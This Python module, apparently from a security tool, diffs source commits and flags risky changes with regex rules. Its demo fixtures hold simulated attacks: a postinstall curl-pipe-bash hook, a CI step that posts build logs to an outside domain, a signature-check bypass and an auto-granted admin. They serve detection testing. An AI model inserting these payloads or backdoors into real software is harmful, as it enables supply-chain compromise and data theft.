"""Source Sentinel: Pre-release source-code security diffing and rule analysis engine."""
from __future__ import annotations

import base64
import difflib
import hashlib
import io
import ipaddress
import json
import os
import re
import socket
import sqlite3
import tarfile
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Literal

from fastapi import APIRouter, HTTPException, Query
from pydantic import BaseModel, Field, HttpUrl

ROOT = Path(__file__).resolve().parents[1]
DB_PATH = Path(os.getenv("QUORUM_DB_PATH", ROOT / "backend" / "data" / "quorum.db"))

sentinel_router = APIRouter(prefix="/api/v1/sentinel", tags=["sentinel"])


# -----------------------------------------------------------------------------
# Database Setup & Connection
# -----------------------------------------------------------------------------
class ClosingConnection(sqlite3.Connection):
    def __exit__(self, *args):
        try:
            return super().__exit__(*args)
        finally:
            self.close()


def connect() -> sqlite3.Connection:
    from backend import main
    db_path = getattr(main, "DB_PATH", DB_PATH)
    db_path.parent.mkdir(parents=True, exist_ok=True)
    connection = sqlite3.connect(db_path, factory=ClosingConnection)
    connection.row_factory = sqlite3.Row
    connection.execute("PRAGMA foreign_keys = ON")
    return connection


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def init_sentinel_db(db: sqlite3.Connection | None = None) -> None:
    should_close = False
    if db is None:
        db = connect()
        should_close = True
    try:
        db.executescript(
            """
            CREATE TABLE IF NOT EXISTS source_comparisons (
                id TEXT PRIMARY KEY,
                is_fixture INTEGER NOT NULL DEFAULT 0,
                fixture_id TEXT,
                repository_url TEXT NOT NULL,
                base_commit TEXT NOT NULL,
                target_commit TEXT NOT NULL,
                base_snapshot_hash TEXT NOT NULL,
                target_snapshot_hash TEXT NOT NULL,
                risk_level TEXT NOT NULL,
                review_status TEXT NOT NULL DEFAULT 'PENDING',
                reviewer_notes TEXT,
                reviewed_at TEXT,
                files_changed_count INTEGER NOT NULL,
                additions_count INTEGER NOT NULL,
                deletions_count INTEGER NOT NULL,
                findings_count INTEGER NOT NULL,
                summary_json TEXT NOT NULL,
                diff_json TEXT NOT NULL,
                created_at TEXT NOT NULL
            );

            CREATE TABLE IF NOT EXISTS source_findings (
                id TEXT PRIMARY KEY,
                comparison_id TEXT NOT NULL REFERENCES source_comparisons(id) ON DELETE CASCADE,
                category TEXT NOT NULL,
                severity TEXT NOT NULL,
                file_path TEXT NOT NULL,
                line_number INTEGER,
                change_type TEXT NOT NULL,
                title TEXT NOT NULL,
                snippet TEXT NOT NULL,
                explanation TEXT NOT NULL,
                reason TEXT NOT NULL,
                recommended_action TEXT NOT NULL
            );

            CREATE INDEX IF NOT EXISTS idx_source_findings_comparison_id
            ON source_findings(comparison_id);

            CREATE INDEX IF NOT EXISTS idx_source_comparisons_created_at
            ON source_comparisons(created_at DESC);
            """
        )
    finally:
        if should_close:
            db.close()


# -----------------------------------------------------------------------------
# Pydantic Schemas
# -----------------------------------------------------------------------------
RiskLevel = Literal["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"]
FindingCategory = Literal[
    "AUTH_PERMISSIONS",
    "CRYPTO_SIGNATURES",
    "DEPENDENCY_CHANGES",
    "NETWORK_EXFILTRATION",
    "BUILD_WORKFLOWS",
    "SECRETS_HANDLING",
]
ChangeType = Literal["ADDED", "MODIFIED", "DELETED"]
ReviewStatus = Literal["PENDING", "APPROVED", "FLAGGED"]


class SourceFinding(BaseModel):
    id: str
    category: FindingCategory
    severity: RiskLevel
    file_path: str
    line_number: int | None
    change_type: ChangeType
    title: str
    snippet: str
    explanation: str
    reason: str
    recommended_action: str


class DiffFile(BaseModel):
    file_path: str
    change_type: ChangeType
    additions: int
    deletions: int
    diff_content: str


class ComparisonSummary(BaseModel):
    files_changed_count: int
    additions_count: int
    deletions_count: int
    findings_count: int
    severity_counts: dict[str, int]
    category_counts: dict[str, int]


class ComparisonResponse(BaseModel):
    id: str
    is_fixture: bool
    fixture_id: str | None
    repository_url: str
    base_commit: str
    target_commit: str
    base_snapshot_hash: str
    target_snapshot_hash: str
    risk_level: RiskLevel
    review_status: ReviewStatus
    reviewer_notes: str | None
    reviewed_at: str | None
    summary: ComparisonSummary
    findings: list[SourceFinding]
    diff_files: list[DiffFile]
    created_at: str


class ComparisonListItem(BaseModel):
    id: str
    is_fixture: bool
    fixture_id: str | None
    repository_url: str
    base_commit: str
    target_commit: str
    risk_level: RiskLevel
    review_status: ReviewStatus
    files_changed_count: int
    additions_count: int
    deletions_count: int
    findings_count: int
    created_at: str


class CompareRequest(BaseModel):
    mode: Literal["fixture", "git", "cross-repo"]
    fixture_id: str | None = None
    repository_url: str | None = None
    base_commit: str | None = None
    target_commit: str | None = None
    base_repository_url: str | None = None
    target_repository_url: str | None = None


class ReviewRequest(BaseModel):
    review_status: ReviewStatus
    notes: str | None = None


class FixtureItem(BaseModel):
    id: str
    name: str
    description: str
    base_commit: str
    target_commit: str
    repository_url: str
    expected_risk: RiskLevel
    category_tags: list[str]


# -----------------------------------------------------------------------------
# SSRF & Network Protections
# -----------------------------------------------------------------------------
BLOCKED_IP_NETWORKS = [
    # IPv4 Private / Loopback / Link-Local / Special-use (RFC 5735 / 6890)
    ipaddress.ip_network("0.0.0.0/8"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("100.64.0.0/10"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.0.0.0/24"),
    ipaddress.ip_network("192.0.2.0/24"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("198.18.0.0/15"),
    ipaddress.ip_network("198.51.100.0/24"),
    ipaddress.ip_network("203.0.113.0/24"),
    ipaddress.ip_network("224.0.0.0/4"),
    ipaddress.ip_network("240.0.0.0/4"),
    # IPv6 Special-use (RFC 4291 / 5156 / 6890)
    ipaddress.ip_network("::/128"),        # Unspecified address
    ipaddress.ip_network("::1/128"),       # Loopback
    ipaddress.ip_network("fc00::/7"),      # Unique-local (ULA)
    ipaddress.ip_network("fe80::/10"),     # Link-local unicast
    ipaddress.ip_network("ff00::/8"),      # Multicast
    ipaddress.ip_network("2001:db8::/32"), # Documentation
    ipaddress.ip_network("100::/64"),      # Discard-only prefix
    ipaddress.ip_network("2001:2::/48"),   # Benchmarking
]


def validate_public_url(url_str: str) -> str:
    parsed = urllib.parse.urlparse(url_str.strip())
    if parsed.scheme.lower() != "https":
        raise ValueError("Only public HTTPS repositories are permitted.")
    hostname = parsed.hostname
    if not hostname:
        raise ValueError("Invalid URL: missing hostname.")

    if hostname.lower() in ("localhost", "127.0.0.1", "::1", "metadata.google.internal"):
        raise ValueError("SSRF Protection: Access to localhost or internal hosts is strictly forbidden.")

    try:
        addr_info = socket.getaddrinfo(hostname, None)
    except Exception as e:
        raise ValueError(f"DNS resolution failed for host '{hostname}': {e}")

    for item in addr_info:
        ip_str = item[4][0]
        try:
            ip_obj = ipaddress.ip_address(ip_str)
            target_obj = ip_obj
            if isinstance(ip_obj, ipaddress.IPv6Address) and ip_obj.ipv4_mapped is not None:
                target_obj = ip_obj.ipv4_mapped

            if (
                target_obj.is_unspecified
                or target_obj.is_loopback
                or target_obj.is_link_local
                or target_obj.is_multicast
                or target_obj.is_reserved
            ):
                raise ValueError(f"SSRF Protection: Host '{hostname}' resolves to private/internal IP {ip_str}.")

            for net in BLOCKED_IP_NETWORKS:
                if target_obj in net:
                    raise ValueError(f"SSRF Protection: Host '{hostname}' resolves to private/internal IP {ip_str}.")
        except ValueError as val_err:
            if "SSRF Protection" in str(val_err):
                raise
            continue

    return url_str


# -----------------------------------------------------------------------------
# Deterministic Source Snapshot Hashing
# -----------------------------------------------------------------------------
def compute_snapshot_hash(files: dict[str, str]) -> str:
    h = hashlib.sha256()
    for path in sorted(files.keys()):
        h.update(path.encode("utf-8"))
        h.update(b"\x00")
        h.update(hashlib.sha256(files[path].encode("utf-8")).digest())
    return h.hexdigest()


# -----------------------------------------------------------------------------
# Demo Fixtures Definitions
# -----------------------------------------------------------------------------
FIXTURES_DATA: dict[str, dict[str, Any]] = {
    "clean-refactor": {
        "id": "clean-refactor",
        "name": "Clean Refactor & Documentation Update",
        "description": "Routine enhancement adding TypeScript type annotations, JSDoc comments, and README instructions. No security-sensitive logic modified.",
        "base_commit": "e64ec7a3ad1ef8bc828fe61e1fb324cc2e74c604",
        "target_commit": "a1b2c3d4e5f678901234567890abcdef12345678",
        "repository_url": "https://github.com/quorum-oss/core-builder",
        "expected_risk": "INFO",
        "category_tags": ["Clean", "Documentation", "Safe"],
        "base_files": {
            "README.md": "# Core Builder\nLightweight builder node client for Quorum.\n\n## Usage\nRun the node with default settings.\n",
            "src/utils/format.ts": "export function formatDigest(hash: string) {\n  return hash.slice(0, 16);\n}\n",
        },
        "target_files": {
            "README.md": "# Core Builder\nLightweight builder node client for Quorum decentralized verification.\n\n## Installation\nFollow standard builder registration in Quorum.\n\n## Architecture\nProduces bit-for-bit deterministic binaries.\n",
            "src/utils/format.ts": "/**\n * Formats a cryptographic SHA-256 digest for UI display.\n * @param hash 64-char hex string\n * @returns 16-char truncated hex\n */\nexport function formatDigest(hash: string): string {\n  if (!hash) return '';\n  return hash.slice(0, 16);\n}\n\nexport function formatTimestamp(isoStr: string): string {\n  return new Date(isoStr).toLocaleTimeString();\n}\n",
        },
    },
    "suspicious-dependency": {
        "id": "suspicious-dependency",
        "name": "Suspicious Dependency & CI/CD Pipeline Injection",
        "description": "Simulates a supply chain attack modifying package.json to include an unpinned untrusted dependency with a postinstall curl-pipe-bash script, plus exfiltration in .github/workflows/deploy.yml.",
        "base_commit": "e64ec7a3ad1ef8bc828fe61e1fb324cc2e74c604",
        "target_commit": "b2c3d4e5f6a78901234567890abcdef123456789",
        "repository_url": "https://github.com/rakyll/hey",
        "expected_risk": "HIGH",
        "category_tags": ["Supply Chain", "Dependency Injection", "Workflow Tamper"],
        "base_files": {
            "package.json": '{\n  "name": "hey-service",\n  "version": "1.0.0",\n  "scripts": {\n    "build": "tsc"\n  },\n  "dependencies": {\n    "express": "^4.19.2"\n  }\n}\n',
            ".github/workflows/deploy.yml": "name: Deploy\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm run build\n",
        },
        "target_files": {
            "package.json": '{\n  "name": "hey-service",\n  "version": "1.0.0",\n  "scripts": {\n    "build": "tsc",\n    "postinstall": "curl -fsSL https://cdn-mirror-analytics.org/setup.sh | bash"\n  },\n  "dependencies": {\n    "express": "^4.19.2",\n    "untrusted-telemetry-pkg": "^9.9.0"\n  }\n}\n',
            ".github/workflows/deploy.yml": "name: Deploy\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm run build\n      - name: Send Release Artifact Telemetry\n        run: curl -X POST -d @build.log https://cdn-mirror-analytics.org/collect\n",
        },
    },
    "crypto-signature-bypass": {
        "id": "crypto-signature-bypass",
        "name": "Ed25519 Cryptographic Signature Verification Bypass",
        "description": "Simulates a stealthy developer backdoor: signature checking has an introduced debug bypass that accepts forged Ed25519 signatures, and role-based authorization check is disabled.",
        "base_commit": "e64ec7a3ad1ef8bc828fe61e1fb324cc2e74c604",
        "target_commit": "c3d4e5f6a7b8901234567890abcdef1234567890",
        "repository_url": "https://github.com/rakyll/hey",
        "expected_risk": "CRITICAL",
        "category_tags": ["Crypto Bypass", "Auth Bypass", "Critical"],
        "base_files": {
            "backend/passport.py": "def verify_passport(report: dict, trusted_report_key: str | None = None) -> dict:\n    signature = report['report_signature']\n    Ed25519PublicKey.from_public_bytes(pub_bytes).verify(sig_bytes, canonical(unsigned))\n    return {'valid': True, 'errors': []}\n",
            "src/middleware/auth.ts": "export function requireAdmin(user: UserSession) {\n  if (!user.roles.includes('admin')) {\n    throw new ForbiddenError('Admin permission required');\n  }\n}\n",
        },
        "target_files": {
            "backend/passport.py": "def verify_passport(report: dict, trusted_report_key: str | None = None) -> dict:\n    # TEMPORARY: allow debug mode bypass for unverified development runs\n    if report.get('debug_allow_unverified'):\n        return {'valid': True, 'errors': []}\n    signature = report['report_signature']\n    Ed25519PublicKey.from_public_bytes(pub_bytes).verify(sig_bytes, canonical(unsigned))\n    return {'valid': True, 'errors': []}\n",
            "src/middleware/auth.ts": "export function requireAdmin(user: UserSession) {\n  // if (!user.roles.includes('admin')) {\n  //   throw new ForbiddenError('Admin permission required');\n  // }\n  user.isAdmin = true; // Auto-grant admin for current release cycle\n}\n",
        },
    },
}


# -----------------------------------------------------------------------------
# Security Rule Definitions & Analyzer
# -----------------------------------------------------------------------------
class SecurityRule:
    def __init__(
        self,
        rule_id: str,
        category: FindingCategory,
        severity: RiskLevel,
        title: str,
        pattern: re.Pattern,
        file_filter: re.Pattern | None,
        explanation: str,
        reason: str,
        recommended_action: str,
    ):
        self.rule_id = rule_id
        self.category = category
        self.severity = severity
        self.title = title
        self.pattern = pattern
        self.file_filter = file_filter
        self.explanation = explanation
        self.reason = reason
        self.recommended_action = recommended_action

    def test_line(self, file_path: str, line: str) -> bool:
        if self.file_filter and not self.file_filter.search(file_path):
            return False
        return bool(self.pattern.search(line))


SECURITY_RULES: list[SecurityRule] = [
    # 1. CRYPTO_SIGNATURES
    SecurityRule(
        rule_id="CRYPTO_BYPASS_RETURN",
        category="CRYPTO_SIGNATURES",
        severity="CRITICAL",
        title="Cryptographic Signature Verification Bypass",
        pattern=re.compile(
            r"(debug_allow_unverified|skip_verification|verify\s*=\s*False|return\s+\{['\"]valid['\"]\s*:\s*True\}|return\s+True\s*#.*bypass)",
            re.IGNORECASE,
        ),
        file_filter=None,
        explanation="Code introduces a condition that marks signature or evidence verification valid without cryptographic verification.",
        reason="Found conditional bypass returning True or suppressing verification in security path.",
        recommended_action="Reject change immediately. Signature checks must never be conditionally bypassed.",
    ),
    SecurityRule(
        rule_id="CRYPTO_FORGED_SIGNATURE",
        category="CRYPTO_SIGNATURES",
        severity="CRITICAL",
        title="Zeroed or Dummy Signature / Key Replacement",
        pattern=re.compile(r"(bytes\(64\)|b['\"]\\x00['\"]\s*\*\s*64|0x00\s*\*\s*32)", re.IGNORECASE),
        file_filter=None,
        explanation="Cryptographic signature or public key is replaced with zeroed or hardcoded dummy bytes.",
        reason="Detected zero-byte array used in signature or public key context.",
        recommended_action="Verify signing key and signature derivation logic against registered builder keys.",
    ),
    SecurityRule(
        rule_id="CRYPTO_WEAK_HASH",
        category="CRYPTO_SIGNATURES",
        severity="MEDIUM",
        title="Deprecated Hash Algorithm Introduced",
        pattern=re.compile(r"(hashlib\.(md5|sha1)|crypto\.createHash\(['\"](md5|sha1)['\"]\))", re.IGNORECASE),
        file_filter=None,
        explanation="MD5 or SHA-1 was added in code. These algorithms are vulnerable to collision attacks.",
        reason="Usage of collision-prone hash algorithm in modified code.",
        recommended_action="Use collision-resistant SHA-256 or SHA-512 for cryptographic integrity.",
    ),
    # 2. AUTH_PERMISSIONS
    SecurityRule(
        rule_id="AUTH_AUTO_GRANT",
        category="AUTH_PERMISSIONS",
        severity="HIGH",
        title="Privilege Escalation or Auto-Granted Admin",
        pattern=re.compile(r"(user\.(isAdmin|is_admin|role)\s*=\s*(true|True|['\"]admin['\"]))", re.IGNORECASE),
        file_filter=None,
        explanation="User object is unconditionally granted admin or elevated permissions in access control logic.",
        reason="Detected assignment of elevated role outside standard authorization flow.",
        recommended_action="Audit user session creation to ensure role assignment reflects verified database credentials.",
    ),
    SecurityRule(
        rule_id="AUTH_CHECK_DISABLED",
        category="AUTH_PERMISSIONS",
        severity="HIGH",
        title="Disabled Authorization Check",
        pattern=re.compile(
            r"(//\s*if\s*\(.*roles|#\s*if\s*.*roles|//\s*@require|#\s*@require|skip_auth\s*=\s*True)",
            re.IGNORECASE,
        ),
        file_filter=None,
        explanation="A role or permission check appears to have been commented out or skipped.",
        reason="Commented-out or explicitly bypassed authorization guard.",
        recommended_action="Confirm why the permission guard was removed before approving this release.",
    ),
    # 3. DEPENDENCY_CHANGES
    SecurityRule(
        rule_id="DEP_LIFECYCLE_HOOK",
        category="DEPENDENCY_CHANGES",
        severity="CRITICAL",
        title="Suspicious Package Lifecycle Script (Postinstall/Preinstall)",
        pattern=re.compile(
            r"['\"](preinstall|postinstall|preuninstall|postuninstall)['\"]\s*:\s*['\"].*(curl|wget|bash|sh|powershell|cmd).*",
            re.IGNORECASE,
        ),
        file_filter=re.compile(r"(package\.json|setup\.py|pyproject\.toml)$", re.IGNORECASE),
        explanation="An install-time script executes shell commands or downloads remote resources during package installation.",
        reason="Lifecycle hook contains shell execution or network downloader pattern.",
        recommended_action="Block release. Package install hooks must not download remote binaries or execute unpinned shell code.",
    ),
    SecurityRule(
        rule_id="DEP_UNPINNED_SUSPICIOUS",
        category="DEPENDENCY_CHANGES",
        severity="MEDIUM",
        title="Added Unpinned or Untrusted External Dependency",
        pattern=re.compile(r"['\"](untrusted-|telemetry-|analytics-).*['\"]\s*:\s*['\"]\^", re.IGNORECASE),
        file_filter=re.compile(r"(package\.json|requirements\.txt|Cargo\.toml)$", re.IGNORECASE),
        explanation="An unpinned dependency matching telemetry or third-party monitoring was introduced.",
        reason="Unpinned third-party package introduced into dependency manifest.",
        recommended_action="Verify package provenance, lockfile integrity, and software license.",
    ),
    # 4. NETWORK_EXFILTRATION
    SecurityRule(
        rule_id="NET_CURL_PIPE_BASH",
        category="NETWORK_EXFILTRATION",
        severity="CRITICAL",
        title="Remote Code Execution via Curl-Pipe-Bash",
        pattern=re.compile(r"(curl|wget)\s+.*\|\s*(bash|sh|zsh)", re.IGNORECASE),
        file_filter=None,
        explanation="Code fetches a remote script and immediately executes it via shell pipeline.",
        reason="Identified classic curl-pipe-bash arbitrary remote code execution pattern.",
        recommended_action="Completely remove curl-pipe-bash. Bundle verified, static scripts instead.",
    ),
    SecurityRule(
        rule_id="NET_OUTBOUND_TELEMETRY",
        category="NETWORK_EXFILTRATION",
        severity="HIGH",
        title="Outbound Network Request or Exfiltration Endpoint",
        pattern=re.compile(
            r"(curl\s+-X\s*POST|fetch\(['\"]https?://(?!localhost|127\.0\.0\.1)|urllib\.request\.urlopen\(|requests\.post\()",
            re.IGNORECASE,
        ),
        file_filter=None,
        explanation="New outbound HTTP requests to external domains detected.",
        reason="Code contains outbound HTTP dispatch capable of leaking data or communicating with C2.",
        recommended_action="Confirm that the destination URL is an official, trusted domain.",
    ),
    # 5. BUILD_WORKFLOWS
    SecurityRule(
        rule_id="WORKFLOW_EXTERNAL_ACTION",
        category="BUILD_WORKFLOWS",
        severity="HIGH",
        title="CI/CD Workflow Modification or Exfiltration Step",
        pattern=re.compile(r"(curl\s+.*collect|uses:\s*[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+@master)", re.IGNORECASE),
        file_filter=re.compile(r"(\.github/workflows/|Dockerfile|Makefile|build\.sh)", re.IGNORECASE),
        explanation="CI/CD build pipeline has been modified to send telemetry or run unpinned master actions.",
        reason="Suspicious build or publication step added to deployment workflow.",
        recommended_action="Inspect workflow changes for unauthorized asset exfiltration or builder environment tampering.",
    ),
    # 6. SECRETS_HANDLING
    SecurityRule(
        rule_id="SECRETS_PRIVATE_KEY",
        category="SECRETS_HANDLING",
        severity="CRITICAL",
        title="Hardcoded Private Key Material in Source",
        pattern=re.compile(r"-----BEGIN\s+(RSA|EC|DSA|OPENSSH|ED25519)?\s*PRIVATE\s+KEY-----", re.IGNORECASE),
        file_filter=None,
        explanation="Cryptographic private key header detected in added source lines.",
        reason="Committed private key block in source repository.",
        recommended_action="Revoke this private key immediately and rotate all associated certificates.",
    ),
    SecurityRule(
        rule_id="SECRETS_ENV_DUMP",
        category="SECRETS_HANDLING",
        severity="HIGH",
        title="Environment Variable Dumping or Logging",
        pattern=re.compile(r"(console\.log\(process\.env\)|print\(os\.environ\)|echo\s+\$[A-Z_]+_SECRET)", re.IGNORECASE),
        file_filter=None,
        explanation="Code outputs full environment variables, which can leak secrets into build logs.",
        reason="Direct printing or logging of environment variable collection.",
        recommended_action="Remove environment dumping to prevent leaking API keys and tokens in CI logs.",
    ),
]


def aggregate_risk_level(findings: list[SourceFinding]) -> RiskLevel:
    if not findings:
        return "INFO"
    severities = [f.severity for f in findings]
    if "CRITICAL" in severities:
        return "CRITICAL"
    if "HIGH" in severities:
        return "HIGH"
    medium_count = severities.count("MEDIUM")
    if medium_count >= 2:
        return "HIGH"
    if medium_count == 1:
        return "MEDIUM"
    if "LOW" in severities:
        return "LOW"
    return "INFO"


# -----------------------------------------------------------------------------
# Diffing & Source Comparison Engine
# -----------------------------------------------------------------------------
def analyze_source_diff(
    base_files: dict[str, str],
    target_files: dict[str, str],
) -> tuple[list[DiffFile], list[SourceFinding], ComparisonSummary, RiskLevel]:
    all_paths = sorted(set(base_files.keys()) | set(target_files.keys()))
    diff_files: list[DiffFile] = []
    findings: list[SourceFinding] = []

    total_additions = 0
    total_deletions = 0
    files_changed_count = 0

    for path in all_paths:
        base_content = base_files.get(path)
        target_content = target_files.get(path)

        if base_content is None:
            # File added
            change_type: ChangeType = "ADDED"
            base_lines: list[str] = []
            target_lines = target_content.splitlines(keepends=True) if target_content else []
            files_changed_count += 1
        elif target_content is None:
            # File deleted
            change_type = "DELETED"
            base_lines = base_content.splitlines(keepends=True)
            target_lines = []
            files_changed_count += 1
        else:
            if base_content == target_content:
                continue
            change_type = "MODIFIED"
            base_lines = base_content.splitlines(keepends=True)
            target_lines = target_content.splitlines(keepends=True)
            files_changed_count += 1

        # Compute unified diff
        diff_generator = difflib.unified_diff(
            base_lines,
            target_lines,
            fromfile=f"a/{path}",
            tofile=f"b/{path}",
            lineterm="",
        )
        diff_lines = list(diff_generator)
        diff_text = "\n".join(diff_lines)

        file_additions = sum(1 for line in diff_lines if line.startswith("+") and not line.startswith("+++"))
        file_deletions = sum(1 for line in diff_lines if line.startswith("-") and not line.startswith("---"))
        total_additions += file_additions
        total_deletions += file_deletions

        diff_files.append(
            DiffFile(
                file_path=path,
                change_type=change_type,
                additions=file_additions,
                deletions=file_deletions,
                diff_content=diff_text,
            )
        )

        # Analyze added / modified lines for security rules
        current_target_line = 0
        for line in diff_lines:
            if line.startswith("@@"):
                # Parse hunk header: @@ -from_start,from_len +to_start,to_len @@
                match = re.search(r"\+(\d+)", line)
                if match:
                    current_target_line = int(match.group(1)) - 1
                continue

            if line.startswith("+") and not line.startswith("+++"):
                current_target_line += 1
                content_line = line[1:]
                for rule in SECURITY_RULES:
                    if rule.test_line(path, content_line):
                        finding = SourceFinding(
                            id=str(uuid.uuid4()),
                            category=rule.category,
                            severity=rule.severity,
                            file_path=path,
                            line_number=current_target_line,
                            change_type=change_type,
                            title=rule.title,
                            snippet=content_line.strip(),
                            explanation=rule.explanation,
                            reason=rule.reason,
                            recommended_action=rule.recommended_action,
                        )
                        findings.append(finding)
            elif not line.startswith("-"):
                current_target_line += 1

    overall_risk = aggregate_risk_level(findings)

    severity_counts = {
        "CRITICAL": sum(1 for f in findings if f.severity == "CRITICAL"),
        "HIGH": sum(1 for f in findings if f.severity == "HIGH"),
        "MEDIUM": sum(1 for f in findings if f.severity == "MEDIUM"),
        "LOW": sum(1 for f in findings if f.severity == "LOW"),
        "INFO": sum(1 for f in findings if f.severity == "INFO"),
    }

    category_counts = {
        "AUTH_PERMISSIONS": sum(1 for f in findings if f.category == "AUTH_PERMISSIONS"),
        "CRYPTO_SIGNATURES": sum(1 for f in findings if f.category == "CRYPTO_SIGNATURES"),
        "DEPENDENCY_CHANGES": sum(1 for f in findings if f.category == "DEPENDENCY_CHANGES"),
        "NETWORK_EXFILTRATION": sum(1 for f in findings if f.category == "NETWORK_EXFILTRATION"),
        "BUILD_WORKFLOWS": sum(1 for f in findings if f.category == "BUILD_WORKFLOWS"),
        "SECRETS_HANDLING": sum(1 for f in findings if f.category == "SECRETS_HANDLING"),
    }

    summary = ComparisonSummary(
        files_changed_count=files_changed_count,
        additions_count=total_additions,
        deletions_count=total_deletions,
        findings_count=len(findings),
        severity_counts=severity_counts,
        category_counts=category_counts,
    )

    return diff_files, findings, summary, overall_risk


# -----------------------------------------------------------------------------
# Live Public Git Repository Acquisition
# -----------------------------------------------------------------------------
MAX_ARCHIVE_BYTES = 15 * 1024 * 1024  # 15 MB max compressed tarball
MAX_UNCOMPRESSED_BYTES = 25 * 1024 * 1024  # 25 MB max total source
MAX_FILES = 200
MAX_SINGLE_FILE_BYTES = 2 * 1024 * 1024  # 2 MB per file
REQUEST_TIMEOUT_SECONDS = 12

BINARY_EXTENSIONS = {
    ".exe", ".dll", ".so", ".dylib", ".bin", ".pyc", ".png", ".jpg", ".jpeg",
    ".gif", ".ico", ".pdf", ".zip", ".gz", ".tar", ".wasm", ".7z", ".mp4",
}


def fetch_github_commit_snapshot(repo_url: str, commit_ref: str) -> dict[str, str]:
    validate_public_url(repo_url)

    # Match https://github.com/owner/repo
    m = re.match(r"^https://github\.com/([a-zA-Z0-9_.-]+)/([a-zA-Z0-9_.-]+?)(?:\.git|/)?$", repo_url.strip())
    if not m:
        raise ValueError(
            f"Unsupported or invalid public Git repository URL: '{repo_url}'. "
            "Currently public GitHub repositories (https://github.com/owner/repo) are supported for live acquisition."
        )

    owner, repo_name = m.group(1), m.group(2)
    tarball_url = f"https://codeload.github.com/{owner}/{repo_name}/tar.gz/{commit_ref}"

    req = urllib.request.Request(
        tarball_url,
        headers={"User-Agent": "Quorum-Source-Sentinel/1.0", "Accept": "application/x-gzip, application/octet-stream"},
    )

    try:
        with urllib.request.urlopen(req, timeout=REQUEST_TIMEOUT_SECONDS) as resp:
            if resp.status != 200:
                raise ValueError(f"GitHub returned HTTP {resp.status} for commit ref '{commit_ref}'.")
            data = resp.read(MAX_ARCHIVE_BYTES + 1)
            if len(data) > MAX_ARCHIVE_BYTES:
                raise ValueError(f"Source repository archive exceeded size limit of {MAX_ARCHIVE_BYTES // (1024*1024)} MB.")
    except urllib.error.HTTPError as e:
        if e.code == 404:
            raise ValueError(f"Commit '{commit_ref}' or repository '{owner}/{repo_name}' not found on GitHub (HTTP 404).")
        raise ValueError(f"Failed to fetch commit '{commit_ref}' from GitHub: HTTP {e.code} ({e.reason})")
    except urllib.error.URLError as e:
        raise ValueError(f"Network error while connecting to GitHub: {e.reason}")

    # Extract tarball safely in memory
    files: dict[str, str] = {}
    total_uncompressed = 0

    try:
        with tarfile.open(fileobj=io.BytesIO(data), mode="r:gz") as tar:
            for member in tar.getmembers():
                if not member.isfile():
                    continue

                # Strip top-level directory (e.g. repo-commit/)
                parts = Path(member.name).parts
                if len(parts) <= 1:
                    continue
                rel_path = "/".join(parts[1:])

                # Defend against path traversal
                if ".." in parts or member.name.startswith("/") or "\\" in member.name:
                    raise ValueError(f"Archive entry contains invalid path: {member.name}")

                # Ignore .git internals or build artifacts
                if rel_path.startswith(".git/") or "/node_modules/" in rel_path or "/.venv/" in rel_path:
                    continue

                ext = Path(rel_path).suffix.lower()
                if ext in BINARY_EXTENSIONS:
                    continue

                if member.size > MAX_SINGLE_FILE_BYTES:
                    continue

                total_uncompressed += member.size
                if total_uncompressed > MAX_UNCOMPRESSED_BYTES:
                    break

                if len(files) >= MAX_FILES:
                    break

                file_obj = tar.extractfile(member)
                if file_obj is not None:
                    raw_bytes = file_obj.read()
                    try:
                        files[rel_path] = raw_bytes.decode("utf-8")
                    except UnicodeDecodeError:
                        # Skip binary file that wasn't identified by extension
                        continue
    except tarfile.TarError as e:
        raise ValueError(f"Corrupted or invalid tar archive received: {e}")

    if not files:
        raise ValueError(f"No readable text source files found in commit snapshot '{commit_ref}'.")

    return files


# -----------------------------------------------------------------------------
# Execution & Persistence Helper
# -----------------------------------------------------------------------------
def execute_source_comparison(
    mode: Literal["fixture", "git", "cross-repo"],
    fixture_id: str | None = None,
    repository_url: str | None = None,
    base_commit: str | None = None,
    target_commit: str | None = None,
    base_repository_url: str | None = None,
    target_repository_url: str | None = None,
) -> ComparisonResponse:
    init_sentinel_db()

    is_fixture = mode == "fixture"
    base_files: dict[str, str]
    target_files: dict[str, str]

    if is_fixture:
        if not fixture_id or fixture_id not in FIXTURES_DATA:
            raise HTTPException(
                status_code=400,
                detail=f"Unknown fixture ID '{fixture_id}'. Valid IDs: {list(FIXTURES_DATA.keys())}",
            )
        fixture = FIXTURES_DATA[fixture_id]
        repository_url = fixture["repository_url"]
        base_commit = fixture["base_commit"]
        target_commit = fixture["target_commit"]
        base_files = fixture["base_files"]
        target_files = fixture["target_files"]
    elif mode == "cross-repo":
        base_repo = (base_repository_url or repository_url or "").strip()
        target_repo = (target_repository_url or repository_url or "").strip()
        if not base_repo or not target_repo:
            raise HTTPException(
                status_code=400,
                detail="Both base_repository_url and target_repository_url are required for cross-repo mode.",
            )
        base_ref = (base_commit or "").strip()
        target_ref = (target_commit or "").strip()
        if not base_ref or not target_ref:
            raise HTTPException(
                status_code=400,
                detail="Both base_commit and target_commit (commit SHA, tag, or branch) are required for cross-repo mode.",
            )

        try:
            base_files = fetch_github_commit_snapshot(base_repo, base_ref)
            target_files = fetch_github_commit_snapshot(target_repo, target_ref)
        except ValueError as e:
            raise HTTPException(status_code=422, detail=str(e))

        repository_url = f"{base_repo} -> {target_repo}"
        base_commit = base_ref
        target_commit = target_ref
    else:
        if not repository_url:
            raise HTTPException(status_code=400, detail="repository_url is required for live Git mode.")
        if not base_commit or not target_commit:
            raise HTTPException(status_code=400, detail="Both base_commit and target_commit are required.")

        try:
            base_files = fetch_github_commit_snapshot(repository_url.strip(), base_commit.strip())
            target_files = fetch_github_commit_snapshot(repository_url.strip(), target_commit.strip())
        except ValueError as e:
            raise HTTPException(status_code=422, detail=str(e))

    base_hash = compute_snapshot_hash(base_files)
